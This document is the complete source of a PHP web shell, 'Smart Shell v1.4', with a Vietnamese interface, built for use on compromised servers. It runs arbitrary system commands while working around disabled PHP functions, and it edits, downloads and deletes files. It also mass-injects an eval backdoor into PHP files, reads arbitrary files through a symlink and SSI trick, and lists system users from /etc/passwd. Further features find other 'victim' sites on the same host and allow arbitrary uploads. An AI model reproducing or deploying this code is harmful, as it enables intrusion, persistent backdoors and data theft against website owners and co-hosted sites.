<html><head><meta http-equiv= "content-type" content= "text/html; charset=UTF-8" /><style type="text/css">
            td {border: 1px solid #00FF00; background-color:#001f00; padding: 2px; font-size: 12px; color: #33FF00;}
            td:hover{background-color: black; color: #33FF00;}
            input{background-color: black; color: #00FF00; border: 1px solid green;}
            input:hover{background-color: #006600;}
            textarea{background-color: black; color: #00FF00; border: 1px solid white;}
            a {text-decoration: none; color: #66FF00; font-weight: bold;}
            a:hover {color: #00FF00;}
            select{background-color: black; color: #00FF00;}
            #main{border-bottom: 1px solid #33FF00; padding: 5px; text-align: center;}
            #main a{padding-right: 15px; color:#00CC00; font-size: 12px; font-family: arial; text-decoration: none; }
            #main a:hover{color: #00FF00; text-decoration: underline;}
            #bar{width: 100%; position: fixed; background-color: black; bottom: 0; font-size: 10px; left: 0; border-top: 1px solid #FFFFFF; height: 12px; padding: 5px;}
.tab { border:1px solid #2f2f2f; background-image:url(/styles/GocMobile-Toi/imageset/tab.gif); margin: 0px; padding: 1px; vertical-align: center; background-color:#1f1f1f;  font-size: 11px; color:#808080 }.welcome{border:1px solid #2f2f2f; background-image:url(themes/wapik/div_page.gif); margin: 0px; padding:1px; vertical-align: left; background-color: #1f1f1f;  font-size: 11px; color:#808080}table{width: 100%;padding: 0;margin: 0;} tr{padding: 0;} td{padding: 4px;} vtd.profile {padding: 6px;}
.tablebg{}</style><title>Smart Shell v1.4 By Danh Nam</title></head><body style="background-color:black; color:white; text-align: center; ">
<?php 
function execmd($cmd,$disable="None")
{
    if($disable=="None") {$ret=shell_exec($cmd); return $ret;}
    $funcs=array("execmd","exec","passthru","system","popen","proc_open");
    $disable=str_replace(" ","",$disable);
    $dis_funcs=explode(",",$disable);
    foreach($funcs as $safe)
    {
        if(!in_array($safe,$dis_funcs)) 
        {
            if($safe=="exec")
            {
                $ret=@exec($cmd);
                $ret=join("\n",$ret);
                return $ret;
            }
            elseif($safe=="system")
            {
                $ret=@system($cmd);
                return $ret;
            }
            elseif($safe=="passthru")
            {
                $ret=@passthru($cmd);
                return $ret;
            }
            elseif($safe=="execmd")
            {
                $ret=@execmd($cmd);
                return $ret;
            }
            elseif($safe=="popen")
            {
                $ret=@popen("$cmd",'r');
                if(is_resource($ret))
                {
                    while(@!feof($ret))
                    $read.=@fgets($ret);
                    @pclose($ret);
                    return $read;
                }
                return -1;
            }
            elseif($safe="proc_open")
            {
                $cmdpipe=array(
                0=>array('pipe','r'),
                1=>array('pipe','w')
                );
                $resource=@proc_open($cmd,$cmdpipe,$pipes);
                if(@is_resource($resource))
                {
                    while(@!feof($pipes[1]))
                    $ret.=@fgets($pipes[1]);
                    @fclose($pipes[1]);
                    @proc_close($resource);
                    return $ret;
                }
                return -1;
            }
        }
    }
    return -1;
}

$temp = '<center><b><font color="red">.:: Run Command ::.</font></b></center></br></br>
<form method="post"><input type="text" name="cmd" value="dir -ao"></br>Not use text box <input type="checkbox" name="atext" value="1"><input type="submit" name="submit" value="Run CmD"></form></body></html>';
error_reporting(0);
@ini_set("memory_limit","256M");
@set_magic_quotes_runtime(0);
$self=basename($_SERVER['PHP_SELF']);
$safe_mode = @ini_get('safe_mode');
$disable = @ini_get("disable_functions");
if(empty($disable))
{ $disable = 'None'; }
echo '<center><img src="http://upanh.tv/images/75425330042343175686.gif"></img></center></br><div class="tab"><b><font color="red">System Info: </font></b>';
echo execmd("uname -a");
echo '</br><b><font color="red">Disable Funtions: </font></b>'.$disable;
if($safe_mode != 1)
{ echo '</br><b><font color="red">Safe_mode: </font>OFF</b><br>'; }
else { echo '</br><b><font color="red">Safe_mode: </font>ON</b><br>'; }
$ip1 = $_SERVER['REMOTE_ADDR'];
$ip2 = @gethostbyname($_SERVER['HTTP_HOST']);
$uid = @getmyuid();
$user1 = @get_current_user();
$gid = @getmygid();
echo "<font color=red>IP Server: </font><font color=lime>$ip2</font><br><font color=red>You are: </font><font color=lime>$ip1<br></font><font color=red>id</font><font color=lime>: uid=$uid($user1) gid=$gid($user1)</font><br></div>";
echo '<div class="tab"><font color=red>[</font><a href='.$self.'><font color=lime>Home</font></a><font color=red>]</font><font color=red>[</font><a href="?bypass"><font color=lime>Bypasses</font></a><font color=red>]</font> <font color=red>[</font><a href="?base64"><font color=lime>Base64</font></a><font color=red>]</font></div>';
$base = $_POST['base'];
$option = $_POST['option'];
if(isset($_GET['base64']))
{
echo '<br><font color=red>Encode</font><font color=yellow>/</font><font color=red>Decode</font><br><form method=post><input type=text name=base><br><input type=radio name=option value="encode">Ma Hoa<br><input type=radio name=option value="decode">Giai Ma<br><input type=submit name=submit value="Bat dau"></form>';
if(!empty($base) && $option== "encode")
{ 
$acti = base64_encode($base);
echo '<textarea width="100%" height="30px">'.$acti.'</textarea>'; }
if(!empty($base) && $option == "decode")
{
$acti = base64_decode($base);
echo '<textarea width="100%" height="30px">'.$acti.'</textarea>'; }
}
if(isset($_POST['cnewfile']))
{
    if(@fopen($_POST['newfile'],'w')) echo "File created<br>";
    else echo "Failed to create file<br>";
}
if(isset($_POST['cnewdir']))
{
    if(@mkdir($_POST['newdir'])) echo "Directory created<br>";
    else echo "Failed to create directory<br>";
}
function True($s)
{
    if(!$s) return 0;
    if($s>=1073741824) return(round($s/1073741824)." GB");
    elseif($s>=1048576) return(round($s/1048576)." MB");
    elseif($s>=1024) return(round($s/1024)." KB");
    else return($s." B");
}
function SudoMax($d)
{
    $d=str_replace("\\","/",$d);
    $d=str_replace("//","/",$d);
    return $d;
}
function Hocit($d)
{
    $d=explode('/',$d);
    array_pop($d);
    array_pop($d);
    $str=implode($d,'/');
    return $str;
}
if(isset($_POST['massfiles']))
{
    $fail=0;
    $success=0;
    switch($_POST['fileaction'])
    {
        case 'backdoor': #301
        foreach($_POST['files'] as $file)
        {
            $ext=strrchr($file,'.');
            if($ext!=".php") continue;
            @$fh=fopen($file,'a');
            if(@is_resource($fh))
            {
                $success++;
                @fwrite($fh,"<?php @eval(\$_GET['e']) ?>");
                @fclose($fh);
            } else $fail++;
        }
        echo "Successfully created $success backdoor files; failed to created $fail backdoor files</br>Exploit files as such: file.php?e=php code";
        break;
        case 'Delete':
        foreach($_POST['files'] as $file)
        {
            if(is_dir($file)) rm_rep($file,$success,$fail);
            else
            {
                if(@unlink(SudoMax($file)))
                {
                    echo "File $file deleted<br>";
                    $success++;
                }
                else
                {
                    echo "Failed to delete file $file<br>";
                    $fail++;
                }
            }
        }
        echo "Total files deleted: $success; failed to delete $fail files<br>";
        break;
        case 'Chmod':
        foreach($_POST['files'] as $file)
        {
            if(is_dir($file)) chmod_rep($file,$success,$fail,$_POST['cmodv']);
            if(@chmod(SudoMax($file),$_POST['cmodv']))
            {
                echo "Changed mode for $file<br>";
                $success++;
            }
            else
            {
                echo "Failed to change mode for $file<br>";
                $fail++;
            }
        }
        echo "Total files modes modified: $success; failed to chmod $fail files<br>";
        break;
    }
}
if(isset($_POST['doeditfile'])) FileEditor();
switch($_GET['act'])
{ case 'f': FileEditor(); break; }
$dirs=array();
$files=array();
if(!isset($_GET['d'])) {@$d=SudoMax(realpath(getcwd())); @$dh=opendir(".") or die("Permission denied!");}
else {$d=SudoMax($_GET['d']); @$dh=opendir($_GET['d']) or die("Permission denied!");}
$current=explode("/",$d);
echo "<table style='width: 100%; text-align: center;'><tr><td><b><font color=red>Current Directory:</font></b> ";for($p=0;$p<count($current);$p++) 
for($p=0;$p<count($current);$p++)
{
        $cPath.=$current[$p].'/';
        echo "<a href=$self?d=$cPath><b><font color=lime>$current[$p]</font></b></a>/";
}
echo "</td></tr></table>";
if(isset($_GET['d'])) echo "<form action='$self?d=$_GET[d]' method='post'>";
else echo "<form action='$self?' method='post'>";
echo "<table style='width: 100%'>
<tr><td>File</td><td>Size</td><td>Owner/group</td><td>Perms</td><td>Writable</td><td>Modified</td><td>Action</td></tr>";
while(($f=@readdir($dh)))
{
    if(@is_dir($d.'/'.$f)) $dirs[]=$f;
    else $files[]=$f;
}
asort($dirs);
asort($files);
@closedir($dh);
    foreach($dirs as $f)
    {
        @$own=function_exists("posix_getpwuid")?posix_getpwuid(fileowner($d.'/'.$f)):fileowner($d.'/'.$f);
        @$grp=function_exists("posix_getgrgid")?posix_getgrgid(filegroup($d.'/'.$f)):filegroup($d.'/'.$f);
        if(is_array($grp)) $grp=$grp['name'];
        if(is_array($own)) $own=$own['name'];
        $size="Thư Mục";
        @$ch=substr(base_convert(fileperms($d.'/'.$f),10,8),2);
        @$write=is_writable($d.'/'.$f)?"Yes":"No";
        if($f==".") {continue;}
        elseif($f=="..") 
        {
        $f=Hocit($d.'/'.$f);
        echo "<tr><td><a href='$self?act=files&d=$f'>..</a></td><td>$size</td><td>$own/$grp</td><td>$ch</td><td>$write</td><td>$mod</td><td>None</td></tr>";
        continue;
        }
        echo "<tr><td><a href='$self?act=files&d=$d/$f'>$f</a></td><td>$size</td><td>$own/$grp</td><td>$ch</td><td>$write</td><td>$mod</td><td><input type='checkbox' name='files[]' id='check' value='$d/$f'></td></tr>";
    }
    foreach($files as $f)
    {
        @$own=function_exists("posix_getpwuid")?posix_getpwuid(fileowner($d.'/'.$f)):fileowner($d.'/'.$f);
        @$grp=function_exists("posix_getgrgid")?posix_getgrgid(filegroup($d.'/'.$f)):filegroup($d.'/'.$f);
        if(is_array($grp)) $grp=$grp['name'];
        if(is_array($own)) $own=$own['name'];
        @$size=True(filesize($d.'/'.$f));
        @$ch=substr(base_convert(fileperms($d.'/'.$f),10,8),3);
        @$write=is_writable($d.'/'.$f)?"Yes":"No";
        @$mod=date("d/m/Y H:i:s",filemtime($d.'/'.$f));
        echo "<tr><td><a href='$self?act=f&file=$d/$f'>$f</a></td><td>$size</td><td>$own/$grp</td><td>$ch</td><td>$write</td><td>$mod</td><td><input type='checkbox' name='files[]' id='check' value='$d/$f'></td></tr>";
    }
    echo "</table>
    <input type='button' style='background-color: none; border: 1px solid white;' value='Toggle' onClick='togglecheck()'></br>
    With checked file(s): 
    <select name='fileaction'>
    <option name='chmod'>Chmod</option>
    <option name='delete'>Delete</option>
    <option name='backdoor'>Backdoor</option><input type='text' value='chmod value' name='cmodv'>
    </select>
    <br><input type='submit' value='Go' name='massfiles'></form>";
function FileEditor()
{
    if(isset($_GET['file']))
    $file=$_GET['file'];
    elseif(isset($_POST['nfile']))
    $file=$_POST['nfile'];
    elseif(isset($_POST['editfile']))
    $file=$_POST['editfile'];
    if(@!file_exists($file)) die("Permission denied!");
    if(isset($_POST['dfile']))
    {
        @$fh=fopen($file,'r');
        @$buffer=fread($fh,filesize($file));
        header("Content-type: application/octet-stream");
           header("Content-length: ".strlen($buffer));
          header("Content-disposition: attachment; filename=".basename($file).';');
        @ob_get_clean();
          echo $buffer;
        @fclose($fh);
    }
    elseif(isset($_POST['delfile']))
    {
        if(!unlink(str_replace("//","/",$file))) echo "Failed to delete file!<br>";
        else echo "File deleted<br>";
    }
    elseif(isset($_POST['sfile']))
    {
        $fh=@fopen($file,'w') or die("Failed to open file for editing!");
        @fwrite($fh,stripslashes($_POST['file_contents']),strlen($_POST['file_contents']));
        echo "File saved!";
        @fclose($fh);
    }
    else
    {
        $fh=@fopen($file,'r');
        echo "<center>
        <form action='$self?act=f' method='post'>
        File to edit: <input type='text' style='width: 300px' value='$file' name='nfile'>
        <input type='submit' value='Go' name='gfile'></br></br>";
        echo "<textarea rows='20' cols='150' name='file_contents'>".htmlspecialchars(@fread($fh,filesize($file)))."</textarea></br></br>";
        echo "<input type='submit' value='Save file' name='sfile'>
        <input type='submit' value='Download file' name='dfile'>
        <input type='submit' value='Delete file' name='delfile'>
        </center></form>";
        @fclose($fh);
    }
}
$relpath=(isset($_GET['d']))?SudoMax($_GET['d']):SudoMax(realpath(getcwd()));
if(isset($_GET['d'])) $self.="?d=$_GET[d]";
if(isset($_GET['bypass']))
{
$local = $_POST['local'];
echo '<br><font color=red>ByPass</font><br><form method=post><input type=text name=local value="Nhap path file can symlink"><input type=submit name=submit value=Ok></form>';
execmd("rm cmd.txt");
$hocit = 'ln -s '.$local.' cmd.txt';
execmd($hocit);
$fp = fopen("cmd.shtml","w+") or exit("Failed");
$bypass = '<!--#include virtual="cmd.txt" -->';
fwrite($fp,$bypass);
fclose($fp);
if(!empty($local))
{ echo '<a href="cmd.shtml"><font color=lime>Okay, Click Here</font></a>'; }
}
echo $temp;
$cmd = $_POST['cmd'];
$atext = $_POST['atext'];
if(!empty($cmd))
{ echo 'Run: <font color="green">'.$cmd.'</font></br>'; }
if(!empty($cmd) && $atext != 1)
{ echo '<textarea width="100%" height="30px">'.@htmlspecialchars(execmd($cmd)).'</textarea>'; }
else { echo @htmlspecialchars(execmd($cmd)); }
if(empty($cmd)) { echo '<textarea width="100%" height="30px">'.execmd("dir -ao").'</textarea>'; }
$cd = getcwd();
if(isset($_POST['file']))
$file=$_POST['file'];
elseif(isset($_POST['nfile']))
$file=$_POST['nfile'];
elseif(isset($_POST['editfile']))
$file=$_POST['editfile'];
$cd2 = $cd.'/'.$file;
if(isset($_POST['sfile']))
{
$fh=@fopen($file,'w') or die("Failed to open file for editing!");
@fwrite($fh,stripslashes($_POST['file_contents']),strlen($_POST['file_contents']));
echo "File saved!";
@fclose($fh);
}
elseif(isset($_POST['delfile']))
{
if(!unlink(str_replace("//","/",$file))) echo "Failed to delete file!<br>";
else echo "File deleted<br>";
}
@$fh=fopen($file,'r');
if(empty($file))
{
echo "<center><form method='post'>
File to edit: <br><input type='text' style='width: 100%' value='$cd' name='nfile'>
<input type='submit' value='Go' name='gfile'></br></br></form></center>";
}
if(!empty($file))
{
echo "<center>
<form method='post'>
File to edit: <br><input type='text' style='width: 100%' value='$file' name='nfile'>
<input type='submit' value='Go' name='gfile'></br></br>";
echo "<textarea rows='20' cols='150' name='file_contents'>".htmlspecialchars(@fread($fh,filesize($file)))."</textarea></br></br>";
echo "<input type='submit' value='Save file' name='sfile'>
<input type='submit' value='Delete file' name='delfile'>
</center></form>";
@fclose($fh);
}
$zipp = $_POST['zipp'];
$zipy = $_POST['zipy'];
echo  '<br><b>Files or dir to zip</b></br><form method=post><input type=text name=zipp value="Path to zip"><input type=text name=zipy value="Zip name?"><input type=submit name=submit value=Ok></form>';
if(!empty($zipp))
{
$zipyy = 'zip -r -9 '.$zipy.' '.$zipp;
execmd($zipyy);
if(file_exists($zipy)) 
{ echo '<font color=red>Files Zip Create Successed!</font>'; } 
else
{ 
echo '<font color=red>Files Zip Create Failed!</font>'; } 
}
$ec = 'cat /etc/passwd |grep "home" |cut -d: -f1';
echo '<br><b>List User</b><br><textarea width="100%" height="30px">'.execmd($ec).'</textarea>'; 
echo "<center>Create directory</center><form action='$self' method='post'><input type='text' style='width: 100%' value='$relpath/' name='newdir'><input type='submit' value='Create' name='cnewdir'></form><center>Create file</center><form action='$self' method='post'><input type='text' style='width: 100%' value='$relpath/' name='newfile'><input type='submit' value='Create' name='cnewfile'></form>";
?>
<br><br><center><font color=white>Path Victim Finder</font></a></center><br>
<?php 
$find2 = $_POST['find2'];
$find21 = $_POST['find21'];
echo  '<form method=post><input type=text name=find2 value="Victim Domain same server"><br><input type=text name=find21 value="any words"><input type=submit name=submit value=Ok></form>';
if(!empty($find21))
{
file_get_contents('http://'.$find2.'/'.$find21);
$abs = 'cat /usr/local/apache/logs/error_log|grep '.$find21.'|cut -d: -f4';
$find3 = execmd($abs);
}
if(!empty($find3))
{
echo '<font color=red>Path:</font><br><textarea width=100% height=30px>'.$find3.'</textarea>'; 
} ?>
<form method="post">Enter number file upload: <input type="text" name="txtnum" value="<?php echo $_POST['txtnum']; ?>" size="10" /><input type="submit" name="ok_num" value="Accept"/></form>
<?php if(isset($_POST['ok_num']))
{
	$num=$_POST['txtnum'];
	echo "<hr />";
	echo "Ban dang chon $num file upload<br />";
	echo "<form action='?file=$num' method='post' enctype='multipart/form-data'>";
	for($i=1; $i <= $num; $i++)
	{
		echo "<input type='file' name='fil[]' /><br />";
	}
	echo "<input type='submit' name='ok_upload' value='Upload' />";
	echo "</form>";
}
if(isset($_POST['ok_upload']))
{
	$num=$_GET['file'];
	for($i=0; $i< $num; $i++)
	{
		move_uploaded_file($_FILES['fil']['tmp_name'][$i],"./".$_FILES['fil']['name'][$i]);
		$url="./".$_FILES['fil']['name'][$i];
		$name=$_FILES['fil']['name'][$i];
if(file_exists($name))		
{
echo "Upload Thanh cong file <b>$name</b><br />";
} }
}
?>
<html><div class="tab"> &copy; Developer Duong Danh Nam 2011</div></html>
<?php
echo "Tải trang mất:<font color='red'>".round(microtime()-$start,2)." giây</font>";
ob_end_flush();
?>